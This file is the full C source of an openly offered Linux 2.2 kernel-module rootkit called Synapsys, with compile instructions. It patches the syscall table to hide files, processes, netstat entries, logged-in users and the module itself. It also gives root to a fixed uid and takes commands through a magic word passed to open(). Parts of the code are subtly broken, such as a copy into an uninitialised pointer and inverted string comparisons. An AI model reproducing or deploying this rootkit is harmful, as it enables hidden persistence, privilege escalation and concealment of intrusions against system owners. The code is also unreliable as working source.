/*********************************************************************************************************************
 *  Synapsys-lkm version 0.4
 *
 * coded by Berserker for Neural Collapse Crew  [www.neural-collapse.org]
 *
 *  for questions, suggestions, bug report ---->  berserker.ncl@infinito.it             
 *
 * Description : Synapsys is a linux lkm rootkit for kernel 2.2.x. Feauters file and directory hiding , process hiding 
 * (child and clone too), netstat hiding (defined port and host/ip/port/protocol variable), root privileges to a 
 * defined uid, user hiding (finger/who/w), module hiding. After you insert the module  you can completly control 
 * it with the open() syscall: can activate/deactivate every feature, can change hidden files prefix, hidden lines in 
 * netstat and hidden user.
 * 
 *  Saluti e Ringraziamenti : norby , anyone, beholder, mandarine, asfalto, jerusalem  
 *
 *  compile : gcc -c -O3 -fomit-frame-pointer Synapsys.c
 *
 *********************************************************************************************************************/
#define MODULE
#define __KERNEL__

#if CONFIG_MODVERSIONS==1
#define MODVERSIONS
#include <linux/modversions.h>
#endif 


#include <linux/module.h>
#include <linux/mm.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/if.h>
#include <linux/smp_lock.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/segment.h>
#include <malloc.h>




char *magicword         = "traboz";               /* word to control lkm via open syscall */
char file2hide[20]      = "NCL_ph1l3";            /* files that contains this string in the name are hidden */
char hiddenuser[20]     = "Ncl";                  /* user hidden in finger/who/w */
char netstatstuff[20]   = "host_or_ip_or_port";   /* lines in netstat that contains this are hidden */


#define HIDDEN_PORT "3012"         /* all the ports *3012* */
#define PF_INVISIBLE 0x00002000
#define SIGNAL_INVISIBLE 32        /* signal to hide a process */
#define MAGIC_UID 666
#define LKM_NAME "Synapsys"
#define M_UID_FUNC     "muid"     /* word to act/deact root privileges to MAGIC_UID */
#define GETDENTS_FUNC  "hidf"     /* word to act/deact file and process hiding */
#define UNINST_LKM     "unin"     /* unload module       */
#define NETSTAT_FUNC   "hidn"     /* act/deact netstat hiding */
#define FINGER_FUNC    "hidu"     /* act/deact user hiding */
#define HIDELKM_FUNC   "hidm"     /* act/deact lkm hiding */
#define BE_VERBOSE_CMD "verbose"  /* get variable value for every feature */

int uid_func  = 1;             /* 1 => active, 0 => inactive , default all activated */
int hidf_func = 1;
int nets_func = 1;
int hidu_func = 1;
int hidm_func = 1;

extern void* sys_call_table[];

asmlinkage int (*real_open)(const char *, int  ,int );
asmlinkage int (*real_getuid)();
asmlinkage int (*real_getdents)(unsigned int, struct dirent *,unsigned int);
asmlinkage int (*real_kill)(int, int);
asmlinkage int (*real_fork)(struct pt_regs);
asmlinkage int (*real_clone)(struct pt_regs);
asmlinkage int (*real_write)(unsigned int , char *, unsigned int);
asmlinkage int (*real_query_module)(const char *, int, char *, size_t, size_t *);

asmlinkage void cleanup_module(void);

asmlinkage int hack_open(const char *pathname, int flag, int mod) {

  char *k_pathname;
  char *x,*cmd,*tmp,*arg;
  int i = 0;
  k_pathname = (char*) kmalloc(256, GFP_KERNEL);

  copy_from_user(k_pathname, pathname, 255);
  x = strstr(k_pathname, magicword);
  if ( x ) {
    tmp = &x[strlen(magicword)];
    if (strlen(tmp) >= 4) {
      if (strlen(tmp) > 4)
	  arg = &tmp[4];
      else arg = 0;
      cmd = strncpy(cmd, tmp, 4);
      cmd[4] = '\0';
      if (strcmp(cmd,M_UID_FUNC) == 0) {
	if (arg == 0) {
          if (uid_func == 1) uid_func--;
          else uid_func++;
	}  
	else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)      
	  printk("the value of uid_func is : %d\n",uid_func);
      }
      else if (strcmp(cmd,GETDENTS_FUNC) == 0) {
        if (arg == 0) {
          if (hidf_func) hidf_func--;
          else hidf_func++;
	}
	else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)
	  printk("the value of hidf_func is : %d the hidden files prefix is : %s\n  ",hidf_func,file2hide);
	else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {
	  memset(file2hide,0,sizeof(file2hide));
	  strncpy(file2hide,arg,strlen(arg));
	}
      }
      else if (strcmp(cmd,NETSTAT_FUNC) == 0) {
	if (arg == 0) {
          if (nets_func == 1) nets_func--;
          else nets_func++;
	}
	else if(strcmp(arg,BE_VERBOSE_CMD) == 0) {
	  printk("the value of nets_func is : %d the hidden port is: %s are hidden lines that contains %s too\n"
		 ,nets_func, HIDDEN_PORT, netstatstuff );
	}
	else if (strcmp(arg,BE_VERBOSE_CMD) != 0) {
	  memset(netstatstuff,0,sizeof(netstatstuff));
	  strncpy(netstatstuff,arg,strlen(arg));
	}
      }
      else if(strcmp(cmd,FINGER_FUNC) == 0) {
	if (arg == 0) {
          if (hidu_func == 1) hidu_func--;
          else hidu_func++;
        }
	else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)
	  printk("the value of hidu_func is : %d the hidden user is %s\n", hidu_func, hiddenuser);
	else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {
	  memset(hiddenuser,0,sizeof(hiddenuser));
	  strncpy(hiddenuser,arg,strlen(arg));
	}
      }
      else if(strcmp(cmd,HIDELKM_FUNC) == 0) {
	if (arg == 0) {
	  if (hidm_func == 1) hidm_func--;
	  else hidm_func++;
	}
	else if (arg != 0&& strcmp(arg,BE_VERBOSE_CMD) == 0)
	  printk("the value of hidm_func is : %d the module name hidden is : %s\n",hidm_func, LKM_NAME);
      }

      else if (!strcmp(cmd,UNINST_LKM)) {
	printk("unistalling %s\n",LKM_NAME);
	cleanup_module();
      }
      
    }
    kfree(k_pathname);
    return (real_open(pathname, flag, mod));
  }

  else {
    kfree(k_pathname);
    return(real_open(pathname, flag, mod));
  }
}
asmlinkage int hack_getuid() {
  int a;

    if(uid_func == 1 && current->uid == MAGIC_UID ) {

      current->uid = 0;
      current->euid = 0;
      current->gid = 0;
      current->egid = 0;
      return 0;

    }

    a = real_getuid();
    return a;

}
asmlinkage int my_atoi (char *str) {
  int ret = 0;
  int i;
  for(i = 0; str[i] >='0' && str[i] <='9'; ++i)
    ret = 10 * ret + str[i] - '0';
  return ret;
}

asmlinkage inline char *task_name(struct task_struct *p, char *buf) {
  int i;
  char *name;
  name = p->comm;
  i=sizeof(p->comm);
  do {
    unsigned char c = *name;
    name++;
    i--;
    *buf = c;
    if (!c)
      break;
    if (c == '\\') {
      buf[1] = c;
      buf += 2;
      continue;
    }
    if (c == '\n') {
      buf[0] = '\\';
      buf[1] = 'n';
      buf += 2;
      continue;
    }
    buf++;
  }
  while(i);
  *buf = '\n';
  return buf + 1;
}

 struct task_struct *get_task(pid_t pid) {
  struct task_struct *p = current;
  do { 
    if (p->pid == pid) return p;
    p = p->next_task;
  }
  while (p != current);
  return NULL;
}

asmlinkage int is_invisible(pid_t pid) {

  struct task_struct *task = get_task(pid);
  if (task == NULL) return 0;
  if (task->flags & PF_INVISIBLE) return 1; 
  return 0;
}

asmlinkage int hack_kill(pid_t pid, int sig) {

 struct task_struct *task = get_task(pid); 

 if(task  == NULL)
   return(-ESRCH);

 else if(current->uid && current->euid)
   return(-EPERM);

 
 else if (sig == SIGNAL_INVISIBLE) {
    task->flags |= PF_INVISIBLE;
  }
 else { 
    return (*real_kill)(pid, sig);
 }

}

asmlinkage int hack_fork(struct pt_regs regs) {

  struct task_struct *task;
  pid_t pid;
  int h = 0;

  pid = real_fork(regs);
  task = get_task(pid);

  if (is_invisible(current->pid))
    h++;
  if (h && pid >= 0) {

    if (task == NULL)
      return -ESRCH;
    if (pid <= 1)
      return -1;

    task->flags |= PF_INVISIBLE;
  }
  return pid ;
}

asmlinkage int hack_clone(struct pt_regs regs) {

  struct task_struct *task;
  pid_t pid;
  int h = 0;

  pid = real_clone(regs);
  task = get_task(pid);

  if (is_invisible(current->pid))
    h++;
  if (h && pid >= 0) {

    if (task == NULL)
      return -ESRCH;
    if (pid <= 1)
      return -1;

    task->flags |= PF_INVISIBLE;
  }
  return pid ;
}

asmlinkage int hack_getdents( unsigned int fd, struct dirent *dirp, unsigned int count) {

  unsigned int getdret,n;
  int x , proc = 0;
  struct inode *dinode;
  struct dirent *dirp2, *dirp3; 
  char *hiddenfile = file2hide;

  getdret = (*real_getdents)(fd,dirp,count);
 
#ifdef __LINUX_DCACHE_H
  dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
  dinode = current->files->fd[fd]->f_inode;
#endif

   if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) &&
       MINOR(dinode->i_dev) == 1) proc++;

   if (getdret > 0 ) {

     dirp2 = (struct dirent *) kmalloc(getdret, GFP_KERNEL);
     copy_from_user(dirp2, dirp, getdret);
     dirp3 = dirp2;
     x = getdret ;

     while (x > 0) {

       n = dirp3->d_reclen;
       x -= n;

       if (((strstr ((dirp3->d_name), hiddenfile) != NULL ||
	     (proc && is_invisible(my_atoi(dirp3->d_name))))  && hidf_func )) {

	 if (x != 0) 
	   memmove (dirp3, (char *) dirp3 + dirp3->d_reclen, x);
         else 
 	   dirp3->d_off = 1024;
         getdret -= n;
       }
       if(dirp3->d_reclen == 0) {
	 getdret -= x;
	 x = 0;
       }
       if ( x != 0) 
	 dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
     }
     copy_to_user(dirp, dirp2, getdret);
     kfree(dirp2);
   }
   return getdret;
}

asmlinkage int hack_write(unsigned int fd, char *buf,unsigned int count) {

  char *k_buf;
  char *user = hiddenuser;
  char *whtvr = netstatstuff;
  
  
  if (strcmp(current->comm,"netstat" ) != 0 && strcmp(current->comm, "finger") != 0 && strcmp(current->comm, "w") != 0 && strcmp(current->comm, "who") ) 
    return real_write(fd, buf, count);
  

 
  if ((strcmp(current->comm, "netstat") == 0) && nets_func) {
    k_buf = (char *) kmalloc(2000, GFP_KERNEL);
    memset(k_buf,0,2000);
    copy_from_user (k_buf, buf, 1999);
    if (strstr(k_buf,HIDDEN_PORT) || strstr(k_buf,whtvr) ) {
      kfree(k_buf);
      return count;
    }
    kfree(k_buf);
  } 

  if ((strcmp(current->comm, "finger") == 0 || strcmp(current->comm, "w") || strcmp(current->comm, "who")) && hidu_func) {
    k_buf = (char *) kmalloc(2000, GFP_KERNEL);
    memset(k_buf,0,2000);
    copy_from_user (k_buf, buf, 1999);
    if (strstr(k_buf,user)) {
      kfree(k_buf);
      return count;
    }
    kfree(k_buf);
  }
  return real_write(fd, buf,count);

}

asmlinkage int hack_query_module(const char *name, int which, char *buf, size_t bufsize, size_t *ret) {

  int r, a;
  char *ptr, *match;

  r = real_query_module(name, which, buf, bufsize, ret);

  if (r == -1)
    return -ENOENT;
  if (which != QM_MODULES)
    return r;

  ptr = buf;

  for (a = 0; a < *ret; a++) {
    if (!strcmp(LKM_NAME, ptr) && hidm_func) {
      match = ptr;
      while (*ptr)
	ptr++;
      ptr++;
      memcpy(match, ptr, bufsize -(ptr -(char *)buf));
      (*ret)--;
      return r;
    }
    while (*ptr)
      ptr++;
    ptr++;
  }
  return r;
}


int init_module(void){

  real_open=sys_call_table[SYS_open];
  sys_call_table[SYS_open]=hack_open;

  real_getuid=sys_call_table[SYS_getuid];
  sys_call_table[SYS_getuid]=hack_getuid;

  real_getdents=sys_call_table[SYS_getdents];
  sys_call_table[SYS_getdents]=hack_getdents;

  real_kill=sys_call_table[SYS_kill];
  sys_call_table[SYS_kill]=hack_kill;

  real_fork=sys_call_table[SYS_fork];
  sys_call_table[SYS_fork]=hack_fork;

  real_clone=sys_call_table[SYS_clone];
  sys_call_table[SYS_clone]=hack_clone;

  real_write=sys_call_table[SYS_write];
  sys_call_table[SYS_write]=hack_write;

  real_query_module=sys_call_table[SYS_query_module];
  sys_call_table[SYS_query_module]=hack_query_module;

  return 0;  


}
void cleanup_module(void){

  sys_call_table[SYS_open]=real_open;
  sys_call_table[SYS_getuid]=real_getuid;
  sys_call_table[SYS_getdents]=real_getdents;
  sys_call_table[SYS_kill]=real_kill;
  sys_call_table[SYS_fork]=real_fork;
  sys_call_table[SYS_clone]=real_clone;
  sys_call_table[SYS_write]=real_write;
  sys_call_table[SYS_query_module]=real_query_module;

}










